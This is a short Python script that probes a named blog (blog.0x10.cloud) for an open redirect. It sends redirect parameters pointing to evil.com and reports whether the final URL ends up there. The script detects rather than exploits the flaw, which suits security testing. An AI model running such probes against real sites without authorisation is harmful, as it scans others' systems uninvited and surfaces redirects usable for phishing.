#Author: Affan Telek
#Vulnerability: Potential Open Redirect
#Target: blog.0x10.cloud
import urllib.request
import urllib.parse

base_url = "http://blog.0x10.cloud/"
test_url = "http://evil.com/"

payloads = [
    f"{base_url}/?next={urllib.parse.quote(test_url)}",
    f"{base_url}/?url={urllib.parse.quote(test_url)}",
    f"{base_url}/?redirect={urllib.parse.quote(test_url)}",
    f"{base_url}/?redir={urllib.parse.quote(test_url)}",
    f"{base_url}/?return={urllib.parse.quote(test_url)}"
]

try:
    found = False

    for url in payloads:
        print(f"Testing: {url}")
        request = urllib.request.Request(url, method="GET")

        try:
            response = urllib.request.urlopen(request, timeout=5)
            final_url = response.geturl()

            if "evil.com" in final_url:
                print("\nVULNERABILITY FOUND!")
                print(f"Open redirect detected: {url}")
                print("\nSecurity Risk:")
                print("- Attackers can redirect users to malicious websites.")
                print("- This can be used for phishing and social engineering attacks.")
                found = True
                break
            else:
                print(f"No redirect to external site. Final URL: {final_url}\n")

        except urllib.error.HTTPError as e:
            print(f"HTTP Error: {e.code}\n")
        except urllib.error.URLError as e:
            print(f"URL Error: {e.reason}\n")

    if not found:
        print("No open redirect detected with the tested parameters.")

except Exception as e:
    print(f"Error: {e}")